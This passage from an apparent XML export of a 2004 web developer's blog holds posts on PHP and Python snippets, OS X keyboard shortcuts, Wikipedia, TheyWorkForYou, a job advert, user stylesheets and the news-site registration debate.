&lt;p id=&quot;p-3&quot;&gt;There are two ways of solving this. Firstly, I could give every paragraph on the site a globally unique identifier - something Chris calls a Node ID. That doesn't really tempt me: it's quite a bit of work, and as I'm not currently interested in Transclusion (although maybe I should be) I don't gain anything from it other than a valid index page. The second alternative is the one I've gone for: I'm simply stripping all paragraph IDs from the entries when they are displayed on the front page of the site (and for the entries-by-day views as well). It's a little hackish and it means my &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt; is now doing a bit of lifting when previously it was blissfully unaware of the numbers, but at least it solves the problem at hand. I kind of like the ID of the addressable paragraphs only existing on the &quot;official&quot; entry page in any case.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;Here's the &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; I use to strip out the IDs:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;
$entrytext = preg_replace('/&amp;lt;p id=&quot;p-[^&quot;]+&quot;/', &quot;&amp;lt;p&quot;, $entrytext);
&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-5&quot;&gt;One of the many benefits of writing software for yourself is that you can often take huge liberties: I know for a fact that this naive regular expression (as opposed to a more resilient technique using an &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; tool of some sort) will work on all 1420 entries on this site because, well, I wrote them all.&lt;/p&gt;</field>
		<field name="created">2004-05-30 19:44:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1421</field>
		<field name="title">Wikipedia enhancements</field>
		<field name="slug">praise</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I don't know when it happened, but &lt;a href=&quot;http://www.wikipedia.org/&quot;&gt;Wikipedia&lt;/a&gt; has a stylish new design in mostly valid &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; 1.0 Transitional (the front page validates, some of the inside pages do not) with a &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; layout to boot. They even have &lt;a href=&quot;http://en.wikipedia.org/wiki/Main_Page_%28table_free%29&quot; title=&quot;Wikipedia: Main Page (table free)&quot;&gt;an option&lt;/a&gt; to turn off the single layout table used on their home page. The site seems much easier to navigate now and the organisation of the front page is a masterpiece of information architecture. When you've got over 250,000 articles just in the English version providing a useful home page is going to be a challenge, but Wikipedia pulls it off with aplomb.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;Every time I visit Wikipedia I find something else to be impressed by. This time round it was the &lt;a href=&quot;http://en.wikipedia.org/wiki/Wikipedia:Community_Portal&quot;&gt;Community Portal&lt;/a&gt;, which provides resources for Wikipedia contributors including Things you can do, an Article of the week, a Tip of the day and a myriad of other links. This is seriously well-organised content. It's interesting to see how they deal with the challenges of 250,000 items in a single namespace as well.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;Their &lt;a href=&quot;http://en.wikipedia.org/wiki/Wikipedia:Press_releases/May_2004&quot; title=&quot;Wikipedia:Press releases/May 2004&quot;&gt;recent Webby award&lt;/a&gt; for best community was thoroughly deserved. And yes, they even encourage people to collaborate on writing their press releases.&lt;/p&gt;</field>
		<field name="created">2004-05-31 22:20:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1422</field>
		<field name="title">They Work For You</field>
		<field name="slug">theyWorkForYou</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Today is/was (you never can tell with these wretched time zone differences) &lt;a href=&quot;http://www.xcom2002.com/nc04/&quot;&gt;NotCon 2004&lt;/a&gt;, London's premiere low-cost, informal, one-day technology conference. Friday's &lt;a href=&quot;http://www.ntk.net/2004/06/04/&quot;&gt;MiniNTK&lt;/a&gt; promised the &lt;q cite=&quot;http://www.ntk.net/2004/06/04/&quot;&gt;unveiling of a new project from the people behind FaxYourMP and PublicWhip&lt;/q&gt; and sure enough, here it is: &lt;a href=&quot;http://www.theyworkforyou.com/&quot;&gt;TheyWorkForYou.com&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;TheyWorkForYou.com is the finest example of a &lt;a href=&quot;http://simon.incutio.com/archive/2004/02/17/hackingPolitics&quot; title=&quot;Hacking the political system&quot;&gt;political hack&lt;/a&gt; I've ever seen. It's basically an ultra-user-friendly front-end to the Hansard public record of all speeches and debates in the houses of commons, with each &lt;acronym title=&quot;Member of Parliament&quot;&gt;MP&lt;/acronym&gt; getting their own page complete with a summary of their recent performance and member's interests and a list of their recently recorded parliamentary appearances.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;The community features are pretty impressive as well: you can add comments to any speech made in any debate, and there's also a &lt;a href=&quot;http://www.theyworkforyou.com/addterm/&quot;&gt;user-populated glossary&lt;/a&gt; which is automatically linked in to the speech transcripts.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;But with all that, the most useful feature is probably the most subtle: you can subscribe to an &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; feed of your &lt;acronym title=&quot;Member of Parliament&quot;&gt;MP&lt;/acronym&gt;'s appearances, meaning you can keep track of everything they say on your behalf. It's simple, powerful and a perfect example of the political hacker ethic at work.&lt;/p&gt;</field>
		<field name="created">2004-06-06 21:51:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1423</field>
		<field name="title">OS X Tip: Remapping keyboard shortcuts</field>
		<field name="slug">remappingShortcuts</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;On my Mac, Apple+W is the shortcut for closing a window (or tab in a tabbed application such as Safari or Firefox) while Apple+Q quits the application completely. These keys are right next to each other on the keyboard. Today, for the final time, I hit the wrong key and accidentally sent a couple of days accumulation of useful browser windows straight in to the abyss. I say for the last time because my intended &lt;acronym title=&quot;Internet Relay Chat&quot;&gt;IRC&lt;/acronym&gt; rant about the stupidity of setting those two keys right next to each other was cut off by &lt;a href=&quot;http://www.crystalflame.net/&quot;&gt;Richard Soderberg&lt;/a&gt;, who showed me how to remap keyboard shortcuts for &lt;em&gt;any application&lt;/em&gt; in OS X.&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;Bring up the &lt;samp&gt;Keyboard &amp;amp; Mouse&lt;/samp&gt; preference pane.&lt;/li&gt;
 &lt;li&gt;Hit the &lt;samp&gt;Keyboard Shortcuts&lt;/samp&gt; tab.&lt;/li&gt;
 &lt;li&gt;Click the &lt;samp&gt;+&lt;/samp&gt; icon.&lt;/li&gt;
 &lt;li&gt;Select Firefox from the &lt;samp&gt;Application&lt;/samp&gt; menu.&lt;/li&gt;
 &lt;li&gt;In the &lt;samp&gt;Menu Title&lt;/samp&gt; box, enter the exact text &quot;Quit Firefox&quot;.&lt;/li&gt;
 &lt;li&gt;In the &lt;samp&gt;Keyboard Shortcut&lt;/samp&gt; box, enter a new shortcut (crysflame suggested Option-Apple-Q).&lt;/li&gt;
 &lt;li&gt;Click &lt;samp&gt;Add&lt;/samp&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p id=&quot;p-1&quot;&gt;You'll need to restart Firefox to see the change, but sure enough the old keyboard shortcut has been replaced - and the menu has even been updated to reflect the change! Magic. I'd be interested to know what happens when you try this in apps that have more than one menu item with the same name. Right now I'm going through all my other multi-window apps (SubEthaEdit, Safari etc.) and remapping their quit keys as well.&lt;/p&gt;</field>
		<field name="created">2004-06-08 04:31:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1424</field>
		<field name="title">Backporting from Python 2.3 to Python 2.2</field>
		<field name="slug">backporting</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;We have a home-grown templating system at work, which I intend to dedicate an entry to some time in the future. We originally wrote it in Python 2.2, but upgraded to Python 2.3 a while ago and have since been evolving our code in that environment. Today I found a need to load the most recent version of our templating system on to a small, long neglected application that had been running the original version ever since it had enough features to be usable.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;Unfortunately, this application was running on a server that only had Python 2.2. Installing Python 2.3 would have been somewhat more painful here than on other servers we run for reasons I won't go in to, so I decided to have a go at getting our current code to run under the older Python version.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;In the end, I only had to make three minor changes, all at the top of the file in question.&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;&lt;p id=&quot;p-3&quot;&gt;I added &lt;code class=&quot;python&quot;&gt;from __future__ import generators&lt;/code&gt; as the very first line of the file. We use generators (with the &lt;code class=&quot;python&quot;&gt;yield&lt;/code&gt; statement) in a few places - this feature was only properly added in Python 2.3, but was made available in Python 2.2 as a &quot;future enhancement&quot; through the aforementioned obscure import.&lt;/p&gt;&lt;/li&gt;
 &lt;li&gt;&lt;p id=&quot;p-4&quot;&gt;I added &lt;code class=&quot;python&quot;&gt;True, False = 1, 0&lt;/code&gt; on the next line down. Surprisingly, Python 2.2 had no support for a boolean type and instead used a test for non-zero. The above line defines constants that behave enough like Python 2.3's True and False to avoid any problems.&lt;/p&gt;&lt;/li&gt;
 &lt;li&gt;&lt;p id=&quot;p-5&quot;&gt;I defined an &lt;code class=&quot;python&quot;&gt;enumerate&lt;/code&gt; function, which was introduced for real in Python 2.3. Here's the code I used:&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;
def enumerate(obj):
    for i, item in zip(range(len(obj)), obj):
        yield i, item 
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p id=&quot;p-6&quot;&gt;All in all it only took around ten minutes to put the above together, after which the script worked just fine. It was interesting to see how our code had grown to rely on Python 2.3 features without us realising it.&lt;/p&gt;

&lt;p id=&quot;p-7&quot;&gt;&lt;strong&gt;Update:&lt;/strong&gt; Check this entry's comments for improvements to the above code snippets.&lt;/p&gt;</field>
		<field name="created">2004-06-09 04:58:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1425</field>
		<field name="title">Embracing Best Practice</field>
		<field name="slug">bestPractice</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;D. Keith Robinson is &lt;a href=&quot;http://www.7nights.com/asterisk/archives/sick_of_web_standards.php&quot;&gt;Sick of Web Standards&lt;/a&gt;, and to a certain extent, so am I. Like Keith, I'm not sick of standards themselves; I've been using them for over two years now and couldn't conceive of developing without them. Unlike Keith, I'm not tired of advocating them - but I thoroughly believe that it's time to extend the discussion.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;As web developers and designers, we face an abundance of challenges. Sites must be &lt;a href=&quot;http://www.websiteoptimization.com/&quot; title=&quot;Andy King&amp;apos;s Speed Up Your Site&quot;&gt;fast&lt;/a&gt;, &lt;a href=&quot;http://www.accessify.com/&quot; title=&quot;Ian LLoyd&amp;apos;s Accessify&quot;&gt;accessible&lt;/a&gt;, &lt;a href=&quot;http://www.useit.com/alertbox/&quot; title=&quot;Jakob Nielsen&amp;apos;s Alertbox&quot;&gt;usable&lt;/a&gt;, &lt;a href=&quot;http://www.designbyfire.com/000095.html&quot; title=&quot;Yes, Design matters&quot;&gt;well designed&lt;/a&gt;, &lt;a href=&quot;http://www.findability.org/&quot; title=&quot;Peter Morville&amp;apos;s findability.org&quot;&gt;findable&lt;/a&gt; and &lt;a href=&quot;http://www.webmasterworld.com/forum3/2010.htm&quot; title=&quot;Successful Site in 12 Months with Google Alone&quot;&gt;search engine friendly&lt;/a&gt;, with &lt;a href=&quot;http://www.w3.org/Provider/Style/URI.html&quot; title=&quot;Tim Berners Lee&amp;apos;s Cool URIs don&amp;apos;t change&quot;&gt;smart URLs&lt;/a&gt;, &lt;a href=&quot;http://www.sitepoint.com/forums/&quot; title=&quot;The SitePoint Forums&quot;&gt;well managed communities&lt;/a&gt; and maybe even a &lt;a href=&quot;http://www.homestarrunner.com/&quot; title=&quot;Home Star Runner&quot;&gt;sense of humour&lt;/a&gt;. Most of us find ourselves taking on the role of &lt;a href=&quot;http://www.testycopyeditors.org/&quot; title=&quot;Testy Copy Editors&quot;&gt;copy editors&lt;/a&gt;, &lt;a href=&quot;http://www.python.org/&quot; title=&quot;Python, naturally&quot;&gt;programmers&lt;/a&gt;, &lt;a href=&quot;http://www.wpdfd.com/&quot; title=&quot;Web Page Design for Designers&quot;&gt;designers&lt;/a&gt;, &lt;a href=&quot;http://aifia.org/&quot; title=&quot;The Asilomar Institute for Information Architecture&quot;&gt;information architects&lt;/a&gt;, and much, much more. In addition, we frequently run in to problems that have no correct answer (font sizing is a classic example). Trade-offs have become a way of life.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;It's time to extend the discussion. Web standards are a small but vital part of a larger solution, something I like to think of as web development &lt;strong&gt;best practice&lt;/strong&gt;. Let's face it: web standards are boring! Focusing discussions on them is like taking cooking lessons from a chef who only ever talks about food safety; sure they're important, but there's so much more involved in creating a decent meal.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;There are plenty of benefits of re-framing web standards in the larger context of best practice. Firstly, discussions get a lot more interesting - as I've just demonstrated, there are enough facets to creating effective sites to keep us talking for years to come. Secondly, wrapping web standards in the larger context of industry best practices makes them a much easier pill to swallow. &quot;Our site doesn't validate&quot; is a turn-off. &quot;Let's follow industry best practice&quot; is far more appealing.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;As a community, we need to work together to discover the best ways of doing things. We've discovered web standards: let's move forward to the other pieces of the puzzle.&lt;/p&gt;</field>
		<field name="created">2004-06-11 05:11:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1426</field>
		<field name="title">The orange XML icon sucks</field>
		<field name="slug">sucks</field>
		<field name="body">&lt;p&gt;I'm not a fan of the orange &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; icon, even though I use it on &lt;a href=&quot;http://simon.incutio.com/categories/&quot;&gt;my categories page&lt;/a&gt;. I love the concept of a universally recognised icon for &lt;acronym title=&quot;Really Simple/Stupid/Sexy/Sinful Syndication&quot;&gt;RSS&lt;/acronym&gt; feeds, but &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; is simply the wrong acronym to put on it. Don't think it's liable to cause confusion? Check out this &lt;a href=&quot;http://www.journalism.co.uk/news/story918.shtml&quot; title=&quot;Guardian site to expand RSS services &quot;&gt;excerpt from Journalism.co.uk&lt;/a&gt; (emphasis mine):&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.journalism.co.uk/news/story918.shtml&quot;&gt;&lt;p&gt; The Guardian is planning to launch more XML-based services in the next few months, adding to the news feed services the site already provides to both commercial clients and individual readers.&lt;/p&gt;

&lt;p&gt;XML, &lt;strong&gt;also known as RSS&lt;/strong&gt;, is a method of streaming information from a website. Many sites now offer a free XML feed enabling readers to receive headlines from news sites via a desktop software program. XML also avoids problems involved with sending email newsletters, such as junk mail and out-of-date addresses.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Doh!&lt;/p&gt;</field>
		<field name="created">2004-06-16 18:28:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1427</field>
		<field name="title">I have some gmail invites</field>
		<field name="slug">invites</field>
		<field name="body">&lt;p&gt;I have four &lt;a href=&quot;http://gmail.google.com/&quot;&gt;gmail&lt;/a&gt; invites left. The first four people to leave a comment with their email address can have them (put it in the email field and fill in a &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; as well if you're worried about spam harvesters - the email won't be displayed but I'll still have access to it). No &lt;a href=&quot;http://www.gmailswap.com/&quot; title=&quot;Gmail swap&quot;&gt;random gift&lt;/a&gt; or &lt;a href=&quot;http://www.jluster.org/node/view/134&quot; title=&quot;Do some good&quot;&gt;good deed&lt;/a&gt; necessary - consider it a &quot;thank you&quot; for reading.&lt;/p&gt;

&lt;p&gt;In related news, Adrian's &lt;a href=&quot;http://www.holovaty.com/blog/archive/2004/06/18/1751&quot; title=&quot;Accessing your Gmail inbox with Python&quot;&gt;Python gmail export script&lt;/a&gt; is really rather neat.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; They all went in under 15 minutes! To avoid being bombarded with requests, I'll state now that I have no plans of handing out any more in this manner. Still, it was a fun way of drawing some of the lurkers out of hiding.&lt;/p&gt;</field>
		<field name="created">2004-06-18 23:57:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1428</field>
		<field name="title">Tantek's Fridge</field>
		<field name="slug">fridge</field>
		<field name="body">&lt;p&gt;Recently spotted on Tantek's fridge:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://tantek.com/log/2004/06.html#d22t2210&quot;&gt;&lt;img alt=&quot;Fridge magnets: &amp;quot;end of the Microsoft ride?&amp;quot;&quot; height=&quot;149&quot; src=&quot;http://simon.incutio.com/images/2004/tanteks-fridge.jpg&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</field>
		<field name="created">2004-06-23 09:33:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1429</field>
		<field name="title">Fancy a job?</field>
		<field name="slug">job</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;My placement here in Lawrence, Kansas comes to an end in a few months time, and I'm now in the interesting position of needing to find my own replacement. I'm not going to beat around the bush: this is a fantastic job and an excellent opportunity for anyone looking for a way in to the online news industry. The team here has won so many awards it's hard to keep track of them all, and is very well respected within the industry.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;We're looking for an experienced server-side web developer. Our platform here is &lt;a href=&quot;http://www.modpython.org/&quot;&gt;mod_python&lt;/a&gt; on Apache, but detailed knowledge of Python is not as important as a solid understanding of the web, web technologies and how to build useful web applications. Some Linux systems administration experience is essential as we are responsible for a number of servers. Applicants must have a solid understanding of &lt;acronym title=&quot;Structured Query Language&quot;&gt;SQL&lt;/acronym&gt; (we use PostgreSQL) and relational database theory. Design skills are not important: we have a talented designer on staff (who is also a dab hand at &lt;acronym title=&quot;Cascading Style sheets&quot;&gt;CSS&lt;/acronym&gt;).&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;So why would you want to move to a tiny town in the middle of Kansas to work for a local newspaper? Firstly, Lawrence is not at all like the rest of the state. It's a college town (home of the University of Kansas) with a vibrant downtown area, a thriving music scene and a great atmosphere. The cost of living is low, the quality of living high and the bright lights of Kansas City are only a 40 minute drive away. Check out our local entertainment site, &lt;a href=&quot;http://www.lawrence.com/&quot;&gt;Lawrence.com&lt;/a&gt;, for an idea of just how much this little town has going for it.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;More to the point though, you should move out here because this is a job like no other. We work in a highly creative atmosphere, with the time between someone having a great idea and that idea rolling out on one of our sites measured in days, if not hours. Our unofficial mission statement (according to my boss, &lt;a href=&quot;http://www.robcurley.com/bio/&quot;&gt;Rob Curley&lt;/a&gt;) is to &quot;build cool shit&quot; - and we do. I've written very little about things we've done here over the past year but I plan to make up for it this week by publishing an entry every day focusing on one of the sites we've built.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;If you have any questions, post a comment or &lt;a href=&quot;http://simon.incutio.com/contact/&quot;&gt;contact me directly&lt;/a&gt;. If you want to apply, send a résumé to aholovaty and swillison both at ljworld.com.&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;Adrian has &lt;a href=&quot;http://www.holovaty.com/blog/archive/2004/06/29/1135&quot; title=&quot;Job: Web developer for World Online in Lawrence, Kansas&quot;&gt;more information&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-6&quot;&gt;&lt;strong&gt;Update:&lt;/strong&gt; This position has now been filled.&lt;/p&gt;</field>
		<field name="created">2004-06-29 16:35:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1430</field>
		<field name="title">Compile everything with a one-liner</field>
		<field name="slug">compileall</field>
		<field name="body">&lt;p&gt;The other day, we noticed that the .py files in our main mod_python application at work did not have corresponding compiled .pyc files. mod_python runs as the unprivileged apache user, which on our server doesn't have the required permissions to write the compiled .pyc files in to the directories in which our code lives.&lt;/p&gt;

&lt;p&gt;A bit of digging came up with the &lt;a href=&quot;http://www.python.org/doc/current/lib/module-compileall.html&quot;&gt;compileall&lt;/a&gt; module, which provides functions for byte-compiling Python files in bulk. We invoked it using the following shell one-liner, executed at the upper most directory of our code tree:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;python2.3 -c &quot;import compileall; compileall.compile_dir('.')&quot;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Executed as root, the result was a full set of .pyc bytecode files.&lt;/p&gt;</field>
		<field name="created">2004-07-01 17:59:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1431</field>
		<field name="title">PHP 5 is out!</field>
		<field name="slug">php5</field>
		<field name="body">&lt;p&gt;It's finally here! Unfortunately &lt;a href=&quot;http://www.php.net/&quot;&gt;PHP.net&lt;/a&gt;, while a great site in most respects, fails miserably when it comes to permalinks for news items and/or new software releases. You can grab it from their &lt;a href=&quot;http://www.php.net/downloads.php&quot; title=&quot;PHP Downloads&quot;&gt;downloads page&lt;/a&gt;, and read more about it in the &lt;a href=&quot;http://www.php.net/ChangeLog-5.php&quot; title=&quot;PHP 5 ChangeLog&quot;&gt;changelog&lt;/a&gt;. Now all it needs is widespread adoption. Unfortunately, something tells me PHP 4 is going to stick around for a long, long time.&lt;/p&gt;</field>
		<field name="created">2004-07-14 00:13:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1432</field>
		<field name="title">Instant authentication against an existing web application</field>
		<field name="slug">instant</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I was thinking today about the problem of querying an existing authentication database from a new application - exactly the kind of thing web services are useful for. Then I realised that any web application protected by &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; Basic authentication already provides a standard &lt;acronym title=&quot;Application Programming Interface&quot;&gt;API&lt;/acronym&gt; against which queries can be run. Here's the Python code to do exactly that:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;
def auth_against_url(url, username, password):
    import urllib2, base64
    request = urllib2.Request(url)
    b64 = base64.encodestring('%s:%s' % (username, password))[:-1]
    request.add_header('Authorization', 'Basic %s' % b64)
    try:
        urllib2.urlopen(request)
    except urllib2.HTTPError:
        return False
    return True
&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-1&quot;&gt;To check a username and password against an existing application's user database, just call the above function with the &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; of a page within the existing application as the first argument. The function returns True if the username and password are valid, and False otherwise. It doesn't get much simpler than that.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;A nice side effect of using Python's standard library modules is that they transparently support HTTPS, so authentication can take place over an encrypted channel provided the target application supports it.&lt;/p&gt;</field>
		<field name="created">2004-07-15 00:12:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1433</field>
		<field name="title">Per-site user stylesheets</field>
		<field name="slug">persite</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I've been thinking a lot about per-site user stylsheets recently. Eric Meyer's &lt;a href=&quot;http://archivist.incutio.com/viewlist/css-discuss/13291&quot;&gt;CSS signatures&lt;/a&gt; are great for sites that support them (as this site does), but the sites that really need altering are highly unlikely to carry them. I posted a comment to that effect on photomatt.net &lt;a href=&quot;http://photomatt.net/2004/06/19/css-nomenclature/#comment-5164&quot; title=&quot;CSS Nomenclature&quot;&gt;a while ago&lt;/a&gt;, and thankfully it was spotted by Ryan Tomayko who has published a &lt;a href=&quot;http://naeblis.cx/weblog/PerSiteUserStyles&quot;&gt;simple brilliant hack&lt;/a&gt; that uses &lt;acronym title=&quot;Extensible Binding Language&quot;&gt;XBL&lt;/acronym&gt; in Mozilla's user stylesheet to execute JavaScript which adds a &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; signature to every site you visit.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;I suggest making a couple of minor modifications to Ryan's code. Firstly, it over-writes any existing body tag IDs which could cause problems on the few sites that use a body ID as a hook for per-page styling. I would recommend not over-writing the ID if it already exists, or adding an additional class to the body element instead. More importantly, Ryan's technique couples your browser's user stylesheet to an &lt;acronym title=&quot;Extensible Binding Language&quot;&gt;XBL&lt;/acronym&gt; file hosted on his server. Not only is this a performance menace (for both his server and potentially your browser) but it opens a cross-site scripting vulnerability in that you are executing code from outside your control every time you visit a web page. I recommend hosting the XBL file locally instead, although the best solution would be to upgrade Ryan's hack to a fully self-contained FireFox extension.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;Quibbles aside, it's a brilliant workaround. Be sure to check out the &lt;a href=&quot;http://photomatt.net/2004/07/14/per-site-user-stylesheets/#comment-5737&quot;&gt;comment from michael&lt;/a&gt; on photomatt.net as well.&lt;/p&gt;</field>
		<field name="created">2004-07-15 00:57:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1434</field>
		<field name="title">News site registration</field>
		<field name="slug">registration</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;The single hottest topic in the online news industry at the moment is that of required registration. A number of large news sites (the &lt;a href=&quot;http://www.nytimes.com/&quot;&gt;New York Times&lt;/a&gt;, the &lt;a href=&quot;http://www.washingtonpost.com/&quot;&gt;Washington Post&lt;/a&gt;, the &lt;a href=&quot;http://www.chicagotribune.com/&quot;&gt;Chicago Tribune&lt;/a&gt;) have moved to this model, and many local newspapers are following suit.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;If you haven't seen &lt;a href=&quot;http://www.bugmenot.com/&quot;&gt;BugMeNot&lt;/a&gt;, go and check it out now. It's a simple service for sharing free news site accounts, and it's started to upset some people in the news industry. A post to the &lt;a href=&quot;http://talk.poynter.org/online-news/&quot;&gt;online-news mailing list&lt;/a&gt; inquiring about possible legal action against the site prompted me to reply with the following:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p id=&quot;p-2&quot;&gt;The flaw here is not with BugMeNot -  it's with the entire concept of
user registration in its present form. The reason BugMeNot works is
that there is absolutely no value to an end user in keeping their
account to themselves. If you want to stop people from sharing their
accounts, give them an incentive not to. This is not a difficult thing
to do - I have a large number of accounts on different community sites
which are used to contribute to discussions and manage my personal
information. I would never dream of sharing those accounts with others
- it would allow other people to impersonate me and damage my
reputation. An account that only allows me to read content (a one-way
interaction) is of no value to me, so why not share the account with
others?&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;BugMeNot is not a new idea by any stretch of the imagination: shared
accounts have existed for as long as sites have required registration
for spurious reasons. For as long as I can remember, members of the
MetaFilter community have worked together to set up username/password
combinations of metafilter/metafilter on sites that require
registration to bypass the irritation of setting up yet another
account.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;If you want to fight BugMeNot, the solution is to monitor the site and
ban any accounts for your own site that appear there - but that's just
fighting the symptoms. The core problem is the whole idea of
registration itself: it's anti-web, anti-user, it doesn't scale and
it's a sign of extreme short term thinking. Imagine if every site on
the web required registration - no one would use it!&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;As a web user, I see registration as nothing more than an unnecessary
irritation. Before BugMeNot I would simply hit &quot;Back&quot; whenever I saw a
registration screen; now I use it to carry on through to the articles
and accompanying ads. As a heavy web user who buys online almost as
frequently as offline I'm exactly the kind of demographic sites should
be trying to attract.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p id=&quot;p-6&quot;&gt;Reading the above a few days later, I think it still accurately represents my thoughts on the free registration model.&lt;/p&gt;

&lt;p id=&quot;p-7&quot;&gt;Adrian has also posted &lt;a href=&quot;http://www.holovaty.com/blog/archive/2004/07/16/0244&quot; title=&quot;Required-user-registration debate continues&quot;&gt;his thoughts&lt;/a&gt; on registration, which run along very similar lines to mine.&lt;/p&gt;

&lt;p id=&quot;p-8&quot;&gt;For a great example of the mentality behind registration, check out this &lt;a href=&quot;http://www.thestar.com/static/registration/why_register.html&quot;&gt;spiel&lt;/a&gt; from the Toronto Star (via &lt;a href=&quot;http://www.saila.com/columns/lcky/?2004_07_04_archive.shtml#lcky200407071230&quot;&gt;Craig Saila&lt;/a&gt;):&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.thestar.com/static/registration/why_register.html&quot;&gt;
&lt;p id=&quot;p-9&quot;&gt;Our main goal of asking you to become a registered member of thestar.com is to improve and enhance your online experience with us. Registration is an important piece of our long-term strategy in building a valuable audience for our advertisers and helping us in setting the priorities for future site development and enhancements.&lt;/p&gt;

&lt;p id=&quot;p-10&quot;&gt;[...]&lt;/p&gt;

&lt;p id=&quot;p-11&quot;&gt;By asking you to share some information with us we are able to increase the value of our site to advertisers, who help support the cost of producing one of Canada's top news sites, by offering them the ability to target their advertising messages based on the information you provide.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p id=&quot;p-12&quot;&gt;And that's the problem right there: as a user, the value proposition of having more targetted ads thrown at me just isn't a good enough incentive for me to jump through their hoops.&lt;/p&gt;</field>
		<field name="created">2004-07-16 16:16:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1435</field>
		<field name="title">Site-specific extensions</field>
		<field name="slug">innovate</field>
